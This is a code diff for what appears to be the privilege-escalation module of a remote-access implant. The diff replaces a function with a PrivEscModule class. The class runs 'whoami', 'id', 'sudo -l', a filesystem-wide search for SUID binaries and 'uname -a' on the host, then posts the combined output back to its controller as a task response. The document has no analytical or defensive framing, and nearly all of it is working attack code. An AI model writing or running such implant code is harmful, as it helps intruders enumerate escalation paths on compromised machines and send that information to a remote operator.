@@ -1,34 +1,24 @@
-    # igider/agent_code/priv_esc.py
     import os
-    import json
-    import subprocess
 
-    def priv_esc(self, task_id, method="basic"):
-        """
-        Attempt privilege escalation on the host machine.
-        """
-        try:
-            if method == "basic":
-                result = subprocess.check_output("id && whoami && sudo -l", shell=True).decode()
-            else:
-                result = f"Unknown method: {method}"
-            
-            return self.postMessageAndRetrieveResponse({
+    class PrivEscModule:
+        def __init__(self, postMessage):
+            self.postMessageAndRetrieveResponse = postMessage
+
+        def privesc(self, task_id):
+            output = []
+            try:
+                output.append(os.popen('whoami && id').read())
+                output.append(os.popen('sudo -l').read())
+                output.append(os.popen('find / -perm -4000 -type f 2>/dev/null').read())
+                output.append(os.popen('uname -a').read())
+            except Exception as e:
+                output.append(f"Error during privilege escalation check: {str(e)}")
+
+            data = {
                 "action": "post_response",
                 "responses": [{
                     "task_id": task_id,
-                    "user_output": result,
-                    "completed": True
+                    "user_output": "\n".join(output)
                 }]
-            })
-
-        except Exception as e:
-            return self.postMessageAndRetrieveResponse({
-                "action": "post_response",
-                "responses": [{
-                    "task_id": task_id,
-                    "user_output": str(e),
-                    "completed": True,
-                    "status": "error"
-                }]
-            })
+            }
+            return self.postMessageAndRetrieveResponse(data)
